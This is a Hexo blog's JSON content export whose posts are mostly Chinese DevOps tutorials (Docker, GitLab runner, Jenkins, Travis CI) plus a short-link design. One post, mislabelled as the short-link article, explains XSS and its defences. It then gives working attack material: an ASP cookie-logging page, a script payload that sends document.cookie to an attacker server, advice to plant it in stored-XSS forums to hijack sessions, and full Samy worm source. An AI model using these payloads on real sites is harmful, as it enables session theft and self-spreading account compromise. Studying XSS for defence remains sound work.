{"meta":{"title":"HarryPangPangBlog","subtitle":"","description":"HarryPangPang blog","author":"HarryPangPang","url":"https://HarryPangPang.github.io","root":"/"},"pages":[{"title":"关于","date":"2023-02-20T06:46:49.572Z","updated":"2023-02-20T06:46:49.572Z","comments":false,"path":"about/index.html","permalink":"https://harrypangpang.github.io/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"分类","date":"2023-02-20T06:46:49.572Z","updated":"2023-02-20T06:46:49.572Z","comments":false,"path":"categories/index.html","permalink":"https://harrypangpang.github.io/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2023-02-20T06:46:49.572Z","updated":"2023-02-20T06:46:49.572Z","comments":false,"path":"books/index.html","permalink":"https://harrypangpang.github.io/books/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-02-20T06:46:49.572Z","updated":"2023-02-20T06:46:49.572Z","comments":false,"path":"tags/index.html","permalink":"https://harrypangpang.github.io/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-02-20T06:46:49.572Z","updated":"2023-02-20T06:46:49.572Z","comments":true,"path":"links/index.html","permalink":"https://harrypangpang.github.io/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-02-20T06:46:49.572Z","updated":"2023-02-20T06:46:49.572Z","comments":false,"path":"repository/index.html","permalink":"https://harrypangpang.github.io/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"centos安装node和docker","slug":"centos安装node环境(docker)","date":"2023-02-23T03:15:00.000Z","updated":"2023-02-23T03:30:13.096Z","comments":true,"path":"2023/02/23/centos安装node环境(docker)/","link":"","permalink":"https://harrypangpang.github.io/2023/02/23/centos%E5%AE%89%E8%A3%85node%E7%8E%AF%E5%A2%83(docker)/","excerpt":"","text":"Node curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash nvm install node yum update yum install -y git Docker sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine 2. sudo yum install -y yum-utils 3. sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo 4. sudo yum install docker-ce docker-ce-cli containerd.io 5. sudo systemctl start docker 6.sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.27.2/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose 7. sudo chmod +x /usr/local/bin/docker-compose 8. sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose ## 报错就： yum install -y https://download.docker.com/linux/centos/7/x86_64/stable/Packages/containerd.io-1.2.6-3.3.el7.x86_64.rpm","categories":[],"tags":[{"name":"后端","slug":"后端","permalink":"https://harrypangpang.github.io/tags/%E5%90%8E%E7%AB%AF/"}]},{"title":"短链接实现原理","slug":"xss攻击","date":"2023-02-21T02:41:21.000Z","updated":"2023-02-23T03:30:13.098Z","comments":true,"path":"2023/02/21/xss攻击/","link":"","permalink":"https://harrypangpang.github.io/2023/02/21/xss%E6%94%BB%E5%87%BB/","excerpt":"","text":"xss-introduce xss introduce 理解XSS的攻击手段和原理 掌握xss攻击的防范措施 了解XSS的定义 跨站脚本漏洞将允许攻击者在一个网站中执行恶意脚本，OWASP给出的XSS漏洞定义如下： “一名攻击者可以利用XSS漏洞向不知情的用户发送恶意脚本。终端用户的浏览器无法确定这些脚本是否可信任，并且会自动运行这些恶意脚本。因为它会认为这个脚本来自一个可信任的源，而恶意脚本将访问浏览器中保存的cookie、会话token或其他的敏感信息，并利用这些信息来完成其他的恶意目的，而有些脚本甚至还可以修改页面的HTML代码。” 理解xss的原理（必备） 理解xss的攻击方式 掌握xss的防御措施 理解XSS攻击方式： 反射型：发出请求时，XSS代码出现在URL中（典型的特征，攻击脚本写在URL中，是明文的），作为输入提交到服务器端，服务器端解析后响应（），XSS代码随响应内容一起传回给浏览器（解析了XS代码，服务端把内容与HTML文本下发给浏览器，通常是js脚本），最后浏览器解析执行XSS代码这个过程想一次反射，故叫反射型XSS 演示：构建Node应用，演示反射型XSS攻击 存储型：差别在于提交的代码会存储在服务器端（数据库，内存，服务系统等）下次请求页面时不用再提交XSS代码。 1)反射型XSS: 就如上面的例子，也就是黑客需要诱使用户点击链接。也叫作&quot;非持久型XSS“(Non-persistent XSS) 2)存储型XSS:把用户输入的数据”存储“在服务器端。这种XSS具有很强的稳定性。 比较常见的一个场景是，黑客写下一篇包含恶意Javascript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的Javascript代码。黑客把恶意的脚本保存在服务器端，所以中XSS攻击就叫做&quot;存储型XSS&quot;。 3)DOM based XSS:也是一种反射型XSS，由于历史原因被单独列出来了。通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。 XSS脚本怎么进入服务端？ XSS防御措施： 编码：不能对用户所有输入保持原样 对用户输入的数据进行HTML Entity编码 过滤：把输入不合法的过滤掉，保持安全性 移除用户上传的DOM属性，如onerror，onclick等 移除用户上传的Style节点，script节点，iframe节点等 对于开发人员来说，首先需要注意的是应该对所有用户提交的内容执行坚如磐石输入验证。这包括网址，查 询字符串，header，POST 数据等所有用户提交的内容。只接受您所希望的字符，在您指定的长度内，和指定 的相应的数据的格式。组织，过滤，或忽略一切。 2. 保护被自动执行或来自第三方网站执行的所有敏感功能。在适当的情况使用会话令牌 27、验证码 28系统或者 HTTP 引用头检查。 3. 如果您的网站必须支持用户提供的 HTML，那么你是处在一个安全明智的下滑坡。然而，也有一些事情可以 做，来保护您的网站。请确保您收到的 HTML 内容是良好的，只包含最少的一组安全标签（绝对没有 JavaScript）， 没有包含任何引用远程的内容（尤其是样式表和 JavaScript）。而且，为了多一点的安全性，请将 httpOnly29添 加到您的 cookie 校正：破坏了正常的页面结构，也是一种XSS攻击 避免直接都HTML Entity解码 使用DOM Parse（文本转成DOM结构）转换，校正不配对的DOM标签 掌握XSS的防御措施 实战： 构建Node服务和建立一个评论，实例演示XSS的攻击预防 Xss攻击常见测试语句 &lt;scrtpt&gt;alert(‘test’)&lt;/script&gt; &lt;svg onload=alert(‘test’)&gt; http://www.ocelltech.com/en/so.asp search：inurl:&#x27;Product.asp?BigClassName&#x27;//google 中华网 */&gt;&lt;script&gt;alert(1)&lt;/script&gt; 把alert里面的内容换成document.cookie就可以 */&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 一般的做法是&lt;html&gt; &lt;title&gt;xx&lt;/title&gt; &lt;body&gt; &lt;%testfile = Server.MapPath(&quot;code.txt&quot;) //先构造一个路径，也就是取网站根目录，创造一个在根目录下的code.txt路径，保存在testfile中 msg = Request(&quot;msg&quot;) //获取提交过来的msg变量，也就是cookie值 set fs = server.CreateObject(&quot;scripting.filesystemobject&quot;)//创建一个fs对象 set thisfile = fs.OpenTextFile(testfile,8,True,0) thisfile.WriteLine(&quot;&quot;&amp;msg&amp;&quot;&quot;)//像code.txt中写入获取来的cookie thisfile.close() //关闭 set fs = nothing%&gt; &lt;/body&gt; &lt;/html&gt; 把上述文件保存为cookie.asp文件，放到你自己的网站服务器下。比如这里我们自己搭建的服务器为：http://10.65.20.196:8080。 XSS构造语句 &lt;script&gt;window.open(&#x27;http://10.65.20.196:8080/cookie.asp?msg=&#x27;+document.cookie)&lt;/script&gt; 把上述语句放到你找到的存在XSS的目标中，不过这里最好是存储型xss，比如你找到了某个博客或者论坛什么的存在存储型XSS，你在里面发一篇帖子或者留上你的评论，内容就是上述语句，当其他用户或者管理员打开这个评论或者帖子链接后，就会触发，然后跳转到http://10.65.20.196:8080/cookie.asp?msg=’+document.cookie的页面，然后当前账户的coolie信息就当成参数发到你的网站下的文件里了。然后的然后你就可以那这个cookie登陆了 Samy蠕虫源码 1.&lt;div id=mycode style=&quot;BACKGROUND:url(&#x27;java 2.script:eval(document.all.mycode.expr)&#x27;)&quot;expr=&quot;var B=String.fromCharCode(34);varA=String.fromCharCode(39);function g()&#123;varC;try&#123;varD=document.body.createTextRange();C=D.htmlText&#125;catch(e)&#123;&#125;if(C)&#123;return 3.C&#125;else&#123;return eval(&#x27;document.body.inne&#x27;+&#x27;rHTML&#x27;)&#125;&#125;function 4.getData(AU)&#123;M=getFromURL(AU,&#x27;friendID&#x27;);L=getFromURL(AU,&#x27;Mytoken&#x27;)&#125;function getQueryParams()&#123;varE=document.location.search;var F=E.substring(1,E.length).split(&#x27;&amp;&#x27;);var AS=new Array();for(varO=0;O&lt;F.length;O++)&#123;varI=F[O].split(&#x27;=&#x27;);AS[I[0]]=I[1]&#125;return AS&#125;var J;varAS=getQueryParams();varL=AS[&#x27;Mytoken&#x27;];varM=AS[&#x27;friendID&#x27;];if(location.hostname==&#x27;profile.myspace.com&#x27;)&#123;document.location=&#x27;http://www.myspace.com&#x27;+location.pathname+location.search&#125;else&#123;if(!M)&#123;getData(g())&#125;main()&#125;functiongetClientFID()&#123;return findIn(g(),&#x27;up_launchIC( &#x27;+A,A)&#125;function nothing()&#123;&#125;functionparamsToString(AV)&#123;var N=new 5.String();var O=0;for(var P 6.in AV)&#123;if(O&gt;0)&#123;N+=&#x27;&amp;&#x27;&#125;varQ=escape(AV[P]);while(Q.indexOf(&#x27;+&#x27;)!=-1)&#123;QQ=Q.replace(&#x27;+&#x27;,&#x27;%2B&#x27;)&#125;while(Q.indexOf(&#x27;&amp;&#x27;)!=-1)&#123;QQ=Q.replace(&#x27;&amp;&#x27;,&#x27;%26&#x27;)&#125;N+=P+&#x27;=&#x27;+Q;O++&#125;return 7.N&#125;function httpSend(BH,BI,BJ,BK)&#123;if(!J)&#123;return 8.false&#125;eval(&#x27;J.onr&#x27;+&#x27;eadystatechange=BI&#x27;);J.open(BJ,BH,true);if(BJ==&#x27;POST&#x27;)&#123;J.setRequestHeader(&#x27;Content-Type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);J.setRequestHeader(&#x27;Content-Length&#x27;,BK.length)&#125;J.send(BK);return 9.true&#125;function findIn(BF,BB,BC)&#123;varR=BF.indexOf(BB)+BB.length;varS=BF.substring(R,R+1024);returnS.substring(0,S.indexOf(BC))&#125;functiongetHiddenParameter(BF,BG)&#123;return findIn(BF,&#x27;name=&#x27;+B+BG+B+&#x27; value=&#x27;+B,B)&#125;function getFromURL(BF,BG)&#123;var T;if(BG==&#x27;Mytoken&#x27;)&#123;T=B&#125;else&#123;T=&#x27;&amp;&#x27;&#125;var U=BG+&#x27;=&#x27;;varV=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y&#125;function getXMLObj()&#123;var Z=false;if(window.XMLHttpRequest)&#123;try&#123;Z=new XMLHttpRequest()&#125;catch(e)&#123;Z=false&#125;&#125;else 10.if(window.ActiveXObject)&#123;try&#123;Z=new ActiveXObject(&#x27;Msxml2.XMLHTTP&#x27;)&#125;catch(e)&#123;try&#123;Z=newActiveXObject(&#x27;Microsoft.XMLHTTP&#x27;)&#125;catch(e)&#123;Z=false&#125;&#125;&#125;return 11.Z&#125;var AA=g();var AB=AA.indexOf(&#x27;m&#x27;+&#x27;ycode&#x27;);var AC=AA.substring(AB,AB+4096);varAD=AC.indexOf(&#x27;D&#x27;+&#x27;IV&#x27;);var AE=AC.substring(0,AD);varAF;if(AE)&#123;AEAE=AE.replace(&#x27;jav&#x27;+&#x27;a&#x27;,A+&#x27;jav&#x27;+&#x27;a&#x27;);AEAE=AE.replace(&#x27;exp&#x27;+&#x27;r)&#x27;,&#x27;exp&#x27;+&#x27;r)&#x27;+A);AF=&#x27; 12.but most of all, samy is my hero. &lt;d&#x27;+&#x27;iv id=&#x27;+AE+&#x27;D&#x27;+&#x27;IV&gt;&#x27;&#125;var AG;function getHome()&#123;if(J.readyState!=4)&#123;return&#125;varAU=J.responseText;AG=findIn(AU,&#x27;P&#x27;+&#x27;rofileHeroes&#x27;,&#x27;&lt;/td&gt;&#x27;);AGAG=AG.substring(61,AG.length);if(AG.indexOf(&#x27;samy&#x27;)==-1)&#123;if(AF)&#123;AG+=AF;var 13.AR=getFromURL(AU,&#x27;Mytoken&#x27;);var 14.AS=new 15.Array();AS[&#x27;interestLabel&#x27;]=&#x27;heroes&#x27;;AS[&#x27;submit&#x27;]=&#x27;Preview&#x27;;AS[&#x27;interest&#x27;]=AG;J=getXMLObj();httpSend(&#x27;/index.cfm?fuseaction=profile.previewInterests&amp;MytokenMytoken=&#x27;+AR,postHero,&#x27;POST&#x27;,paramsToString(AS))&#125;&#125;&#125;functionpostHero()&#123;if(J.readyState!=4)&#123;return&#125;var AU=J.responseText;var AR=getFromURL(AU,&#x27;Mytoken&#x27;);var 16.AS=new 17.Array();AS[&#x27;interestLabel&#x27;]=&#x27;heroes&#x27;;AS[&#x27;submit&#x27;]=&#x27;Submit&#x27;;AS[&#x27;interest&#x27;]=AG;AS[&#x27;hash&#x27;]=getHiddenParameter(AU,&#x27;hash&#x27;);httpSend(&#x27;/index.cfm?fuseaction=profile.processInterests&amp;Mytoken=&#x27;+AR,nothing,&#x27;POST&#x27;,paramsToString(AS))&#125;function 18.main()&#123;var AN=getClientFID();varBH=&#x27;/index.cfm?fuseaction=user.viewProfile&amp;friendID=&#x27;+AN+&#x27;&amp;Mytoken=&#x27;+L;J=getXMLObj();httpSend(BH,getHome,&#x27;GET&#x27;);xmlhttp2=getXMLObj();httpSend2(&#x27;/index.cfm?fuseaction=invite.addfriend_verify&amp;friendID=11851658&amp;MytokenMytoken=&#x27;+L,processxForm,&#x27;GET&#x27;)&#125;functionprocessxForm()&#123;if(xmlhttp2.readyState!=4)&#123;return&#125;var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,&#x27;hashcode&#x27;);var AR=getFromURL(AU,&#x27;Mytoken&#x27;);var 19.AS=new 20.Array();AS[&#x27;hashcode&#x27;]=AQ;AS[&#x27;friendID&#x27;]=&#x27;11851658&#x27;;AS[&#x27;submit&#x27;]=&#x27;Add to 21.Friends&#x27;;httpSend2(&#x27;/index.cfm?fuseaction=invite.addFriendsProcess&amp;Mytoken=&#x27;+AR,nothing,&#x27;POST&#x27;,paramsToString(AS))&#125;function 22.httpSend2(BH,BI,BJ,BK)&#123;if(!xmlhttp2)&#123;return 23.false&#125;eval(&#x27;xmlhttp2.onr&#x27;+&#x27;eadystatechange=BI&#x27;);xmlhttp2.open(BJ,BH,true);if(BJ==&#x27;POST&#x27;)&#123;xmlhttp2.setRequestHeader(&#x27;Content-Type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);xmlhttp2.setRequestHeader(&#x27;Content-Length&#x27;,BK.length)&#125;xmlhttp2.send(BK);return 24.true&#125;&quot;&gt;&lt;/DIV&gt;","categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"https://harrypangpang.github.io/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"短链接实现原理","slug":"短链接实现原理","date":"2023-02-20T03:41:21.000Z","updated":"2023-02-23T03:30:13.101Z","comments":true,"path":"2023/02/20/短链接实现原理/","link":"","permalink":"https://harrypangpang.github.io/2023/02/20/%E7%9F%AD%E9%93%BE%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/","excerpt":"","text":"使用背景 短链接顾名思义，就是将长链接转义成短链接。主要使用场景如下： 短信发送长度限制 长链接生成的二维码过于密集，无法使用扫码功能 社交媒体的字符限制 大体流程 用户访问短链接 服务器查找短链接的key，在数据库/缓存中找到对应长链接参数 替换参数并重定向 用户成功访问到长链接网页内容 python代码示例(flask) 生成： def getLink(shortKey): redisKey = &quot;short_link:&quot;+shortKey url = r.get(redisKey) if not url: return None return url def save(shortKey, url): redisKey = &quot;short_link:&quot;+shortKey url = r.set(redisKey, url, 3600*24) return def shortLink(): requestUrl = request.url requestUrl = requestUrl.replace(&quot;http://&quot;, &quot;https://&quot;) # xx(路由地址) url = requestUrl.replace(&quot;/shortLink?&quot;, &quot;/xxx?&quot;) # 将地址参数进行md5转化 hash_md5 = hashlib.md5() hash_md5.update(url.encode(&#x27;utf-8&#x27;)) shortKey = hash_md5.hexdigest() # 获取地址 arrUrl = requestUrl.split(&quot;/shortLink?&quot;) urlHost = arrUrl[0] shortUrl = urlHost + &quot;/to?short_key=&quot; + shortKey # 获得短链地址并存储 savedUrl = getLink(shortKey) if not savedUrl: save(shortKey, url) return shortUrl 访问： def to(): shortKey = request.args.get(&quot;short_key&quot;) if not shortKey: return (&#x27;short key not found&#x27;, 404) url = getLink(shortKey) if not url: return (&#x27;full url not found&#x27;, 404) return redirect(url)","categories":[],"tags":[{"name":"后端","slug":"后端","permalink":"https://harrypangpang.github.io/tags/%E5%90%8E%E7%AB%AF/"}]},{"title":"Gitlab ci/cd","slug":"Gitlab cicd","date":"2022-02-17T06:06:45.000Z","updated":"2023-02-23T03:30:13.095Z","comments":true,"path":"2022/02/17/Gitlab cicd/","link":"","permalink":"https://harrypangpang.github.io/2022/02/17/Gitlab%20cicd/","excerpt":"","text":"Gitlab ci/cd 持续集成 开发-测试-集成测试 持续交付 持续部署 #事先安装好docker，下载地址：https://docs.docker.com/ #拉取gitlab-runner镜像 docker pull gitlab/gitlab-runner 2. ```shell #在shell里运行下面的命令，注意一下volume映射 #-v $HOME/gitlab-runner-volume/config:/etc/gitlab-runner \\这一行的#\\这一行的 $HOME/gitlab-runner-volume/config $HOME可以改成任意本地目录，之后会用到 # -v /var/run/docker.sock:/var/run/docker.sock \\ 这一行的/var/run/docker.sock在win下可能有问题，需要找一下docker的安装位置 docker run -d \\ --name gitlab-runner \\ --restart always \\ -v $HOME/gitlab-runner-volume/config:/etc/gitlab-runner \\ -v /var/run/docker.sock:/var/run/docker.sock \\ gitlab/gitlab-runner:latest #如果需要更新镜像，可以走这一步，否则跳过即可 docker pull gitlab/gitlab-runner:latest docker stop gitlab-runner &amp;&amp; docker rm gitlab-runner docker run -d \\ --name gitlab-runner \\ --restart always \\ -v $HOME/gitlab-runner-volume/config:/etc/gitlab-runner \\ -v /var/run/docker.sock:/var/run/docker.sock \\ gitlab/gitlab-runner:latest 4. ```shell # 注册gitlab-runner 参考https://docs.gitlab.com/runner/register/ docker run --rm -t -i -v $HOME/gitlab-runner/config:/etc/gitlab-runner gitlab/gitlab-runner register 这时候打开你的gitlab #上一步之后，会有一堆问题回答 Runtime platform arch=amd64 os=linux pid=7 revision=4c96e5ad version=12.9.0 Running in system-mode. Please enter the gitlab-ci coordinator URL (e.g. https://gitlab.com/): #上图3的网址 Please enter the gitlab-ci token for this runner: #上图4的地址 Please enter the gitlab-ci description for this runner: [3a594927a932]: vue typescript template Please enter the gitlab-ci tags for this runner (comma separated): #自己定义的标签，比如test,dev Registering runner... succeeded runner=aPsdGq2A Please enter the executor: docker-ssh, parallels, ssh, virtualbox, custom, docker, shell, docker+machine, docker-ssh+machine, kubernetes: #写 docker Please enter the default Docker image (e.g. ruby:2.6): #写 alpine:latest Runner registered successfully. Feel free to start it, but if it&#x27;s running already the config should be automatically reloaded! 回到你的gitlab，你就能看到下面的东西 # 运行下面的命令查看是否有问题 docker logs gitlab-runner 如果看到下面的错误，就证明docker没有生成config.toml，需要手动从之前定义的$HOME下找到config.toml复制到docker里 ERROR: Failed to load config stat /etc/gitlab-runner/config.toml: no such file or directory builds=0 #或者下面的 ERROR: Failed to load config stat /etc/gitlab-runner/config.toml: no such file or directory builds=0 ERROR: Failed to load config stat /etc/gitlab-runner/config.toml: no such file or directory builds=0 ERROR: Failed to load config stat /etc/gitlab-runner/config.toml: no such file or directory builds=0 ERROR: Failed to load config stat /etc/gitlab-runner/config.toml: no such file or directory builds=0 ERROR: Failed to load config stat /etc/gitlab-runner/config.toml: no such file or directory builds=0 解决步骤： docker ps -a #看到类似下面这样的，复制CONTAINER ID #CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES c324fdf55c20 bfb85bb1e211 &quot;gitlab-runner-helpe…&quot; 24 minutes ago Exited (0) 24 minutes ago runner #接着下面的走 docker exec -it 刚才复制的containerid /bin/sh cd /etc/gitlab-runner touch config.toml vi config.toml 然后就是把本地的config.toml贴进去进行 7. 再执行 # Configuration loaded builds=0 Configuration loaded builds=0 Checking for jobs... received job=872 repo_url=https://gitlab.jingle.cn/websh/ff_event_vue_template.git runner=ejiRy6v7 WARNING: Failed to parse &quot;X-GitLab-Trace-Update-Interval&quot; header error=strconv.Atoi: parsing &quot;&quot;: invalid syntax header-value= job=872 runner=ejiRy6v7 WARNING: Failed to parse &quot;X-GitLab-Trace-Update-Interval&quot; header error=strconv.Atoi: parsing &quot;&quot;: invalid syntax header-value= job=872 runner=ejiRy6v7 WARNING: Failed to parse &quot;X-GitLab-Trace-Update-Interval&quot; header error=strconv.Atoi: parsing &quot;&quot;: invalid syntax header-value= job=872 runner=ejiRy6v7 WARNING: Failed to parse &quot;X-GitLab-Trace-Update-Interval&quot; header error=strconv.Atoi: parsing &quot;&quot;: invalid syntax header-value= job=872 runner=ejiRy6v7 WARNING: Failed to parse &quot;X-GitLab-Trace-Update-Interval&quot; header error=strconv.Atoi: parsing &quot;&quot;: invalid syntax header-value= job=872 runner=ejiRy6v7 WARNING: Failed to parse &quot;X-GitLab-Trace-Update-Interval&quot; header error=strconv.Atoi: parsing &quot;&quot;: invalid syntax header-value= job=872 runner=ejiRy6v7 Job succeeded duration=27.6497334s job=872 project=42 runner=ejiRy6v7 WARNING: Failed to parse &quot;X-GitLab-Trace-Update-Interval&quot; header error=strconv.Atoi: parsing &quot;&quot;: invalid syntax header-value= job=872 runner=ejiRy6v7 8. 然后我们在项目的根目录创建一个.gitlab-ci.yml test_job_1: tags: - dev script: - echo Hello world 9. 再push上去的时候就能看到成功了 ![截屏2020-04-08下午4.47.27](/Users/qiang.zhang/Desktop/截屏2020-04-08下午4.47.27.png) 附： image: node:latest cache: paths: - node_modules/ before_script: - node -v - npm -v - npm install stages: development test_job_1: tags: - dev stage: development script: - npm run tpl - npm run build","categories":[],"tags":[{"name":"实践","slug":"实践","permalink":"https://harrypangpang.github.io/tags/%E5%AE%9E%E8%B7%B5/"}]},{"title":"docker部署jenkins","slug":"docker部署jenkins","date":"2022-02-17T06:06:45.000Z","updated":"2023-02-23T03:30:13.096Z","comments":true,"path":"2022/02/17/docker部署jenkins/","link":"","permalink":"https://harrypangpang.github.io/2022/02/17/docker%E9%83%A8%E7%BD%B2jenkins/","excerpt":"","text":"docker部署jenkins 如何使用docker部署Jenkins？按下面步骤走： 安装docker,mac用户可以使用 brew install docker 最好参照官网安装，一路next 2. 查看docker是否安装成功 执行： docker info 出现下面这样就是成功了 Server: Containers: 1 Running: 1 Paused: 0 Stopped: 0 Images: 30 Server Version: 19.03.2 Storage Driver: overlay2 Backing Filesystem: extfs Supports d_type: true Native Overlay Diff: true Logging Driver: json-file Cgroup Driver: cgroupfs Plugins: Volume: local Network: bridge host ipvlan macvlan null overlay Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog Swarm: inactive Runtimes: runc Default Runtime: runc Init Binary: docker-init containerd version: 894b81a4b802e4eb2a91d1ce216b8817763c29fb runc version: 425e105d5a03fabd737a126ad93d62a9eeede87f init version: fec3683 Security Options: seccomp Profile: default Kernel Version: 4.9.184-linuxkit Operating System: Docker Desktop OSType: linux Architecture: x86_64 CPUs: 6 Total Memory: 1.952GiB Name: docker-desktop ID: 3SL2:C77F:5JW2:IOHJ:SMTS ... 新建目录 mkdir jenkins 新建两个文件，分别是Dockerfile和docker-compose.yml 他们的区别可以看一下 Dockerfile FROM openjdk:8-jdk RUN apt-get update &amp;&amp; apt-get install -y git curl &amp;&amp; rm -rf /var/lib/apt/lists/* ARG user=jenkins ARG group=jenkins ARG uid=1000 ARG gid=1000 ARG http_port=8080 ARG agent_port=50000 ENV JENKINS_HOME /var/jenkins_home ENV JENKINS_SLAVE_AGENT_PORT $&#123;agent_port&#125; # Jenkins is run with user `jenkins`, uid = 1000 # If you bind mount a volume from the host or a data container, # ensure you use the same uid RUN groupadd -g $&#123;gid&#125; $&#123;group&#125; \\ &amp;&amp; useradd -d &quot;$JENKINS_HOME&quot; -u $&#123;uid&#125; -g $&#123;gid&#125; -m -s /bin/bash $&#123;user&#125; # Jenkins home directory is a volume, so configuration and build history # can be persisted and survive image upgrades VOLUME /var/jenkins_home # `/usr/share/jenkins/ref/` contains all reference configuration we want # to set on a fresh new installation. Use it to bundle additional plugins # or config file with your custom jenkins Docker image. RUN mkdir -p /usr/share/jenkins/ref/init.groovy.d ENV TINI_VERSION 0.14.0 ENV TINI_SHA 6c41ec7d33e857d4779f14d9c74924cab0c7973485d2972419a3b7c7620ff5fd # Use tini as subreaper in Docker container to adopt zombie processes RUN curl -fsSL https://github.com/krallin/tini/releases/download/v$&#123;TINI_VERSION&#125;/tini-static-amd64 -o /bin/tini &amp;&amp; chmod +x /bin/tini \\ &amp;&amp; echo &quot;$TINI_SHA /bin/tini&quot; | sha256sum -c - COPY init.groovy /usr/share/jenkins/ref/init.groovy.d/tcp-slave-agent-port.groovy # jenkins version being bundled in this docker image ARG JENKINS_VERSION ENV JENKINS_VERSION $&#123;JENKINS_VERSION:-2.60.3&#125; # jenkins.war checksum, download will be validated using it ARG JENKINS_SHA=2d71b8f87c8417f9303a73d52901a59678ee6c0eefcf7325efed6035ff39372a # Can be used to customize where jenkins.war get downloaded from ARG JENKINS_URL=https://repo.jenkins-ci.org/public/org/jenkins-ci/main/jenkins-war/$&#123;JENKINS_VERSION&#125;/jenkins-war-$&#123;JENKINS_VERSION&#125;.war # could use ADD but this one does not check Last-Modified header neither does it allow to control checksum # see https://github.com/docker/docker/issues/8331 RUN curl -fsSL $&#123;JENKINS_URL&#125; -o /usr/share/jenkins/jenkins.war \\ &amp;&amp; echo &quot;$&#123;JENKINS_SHA&#125; /usr/share/jenkins/jenkins.war&quot; | sha256sum -c - ENV JENKINS_UC https://updates.jenkins.io ENV JENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimental RUN chown -R $&#123;user&#125; &quot;$JENKINS_HOME&quot; /usr/share/jenkins/ref # for main web interface: EXPOSE $&#123;http_port&#125; # will be used by attached slave agents: EXPOSE $&#123;agent_port&#125; ENV COPY_REFERENCE_FILE_LOG $JENKINS_HOME/copy_reference_file.log USER $&#123;user&#125; COPY jenkins-support /usr/local/bin/jenkins-support COPY jenkins.sh /usr/local/bin/jenkins.sh ENTRYPOINT [&quot;/bin/tini&quot;, &quot;--&quot;, &quot;/usr/local/bin/jenkins.sh&quot;] # from a derived Dockerfile, can use `RUN plugins.sh active.txt` to setup /usr/share/jenkins/ref/plugins from a support bundle COPY plugins.sh /usr/local/bin/plugins.sh COPY install-plugins.sh /usr/local/bin/install-plugins.sh docker-compose.yml: version: &#x27;3&#x27; services: jenkins: build: . image: &#x27;jenkins/jenkins:lts&#x27; #镜像 container_name: jenkins #容器名 restart: always ports: - &#x27;127.0.0.1:2001:8080&#x27; #本机端口号：容器端口 - &#x27;127.0.0.1:2002:50000&#x27; volumes: - &#x27;.:/var/jenkins_home&#x27; #数据持久目录,默认是当前目录 启动容器 docker-compose up -d 如果有报错的话，这个时候会提示，当有显示done时，就代表成功了。 6. 查看运行中容器 docker-compose ps 你会看到 Name Command State Ports ------------------------------------------------------------------------------------------------------ jenkins /sbin/tini -- /usr/local/b ... Up 127.0.0.1:2002-&gt;50000/tcp, 127.0.0.1:2001-&gt;8080/tcp 打开浏览器输入127.0.0.1:2001或者服务器ip+:2001","categories":[],"tags":[{"name":"实践","slug":"实践","permalink":"https://harrypangpang.github.io/tags/%E5%AE%9E%E8%B7%B5/"}]},{"title":"github博客自动化部署","slug":"gitpages自动部署","date":"2022-02-17T06:06:45.000Z","updated":"2023-02-23T03:30:13.096Z","comments":true,"path":"2022/02/17/gitpages自动部署/","link":"","permalink":"https://harrypangpang.github.io/2022/02/17/gitpages%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/","excerpt":"","text":"github博客自动化部署 原材料：github博客，travis-ci.org 首先你有一个类似xxx.github.io的博客 打开 https://github.com/settings/tokens 点击Personal access tokens旁的generate new token 复制好这个token，之后会需要 打开 https://travis-ci.org/ 用github登陆 点击头像，打开settings，打开你所需要部署的仓库的开关（页面上很明显能找到） 在项目根目录新建.travis.yml，并输入下面 language: node_js node_js: - lts/* cache: directories: - node_modules install: - npm ci script: - npm run docs:build #scripts里输入你自己的脚步，我这里是基于vuepress的 - cd docs/.vuepress/dist - echo &#x27;你自己的网址域名&#x27; &gt; CNAME #如果你需要指向自己的域名 after_script: - git config credential.helper &quot;store --file=.git/credentials&quot; - echo &quot;https://$&#123;GH_TOKEN&#125;:@github.com&quot; &gt; .git/credentials - node ./node_modules/grunt-cli/bin/grunt release - git config --global user.email &quot;邮箱&quot; - git config --global user.name &quot;用户名&quot; - git init - git add . - git commit -m &#x27;deploy&#x27; - git push -f &quot;https://$&#123;GH_TOKEN&#125;@github.com/test/test.github.io.git&quot; master #更换test内容，这里参照你自己的GitHub地址去改 branches: only: - dev deploy: provider: pages skip-cleanup: true local_dir: docs/.vuepress/dist github_token: &quot;$GH_TOKEN&quot; keep-history: true on: branch: dev 在电脑shell里输入 gem install travis travis encrypt GH_TOKEN=&quot;第四步保存的key&quot; --add 这个时候你会发现你的.travis.yml会多出 env: global: - secure: &quot;lots-of-seemingly-random-characters&quot; 这句话，这其实就是加密后的token，用于push代码 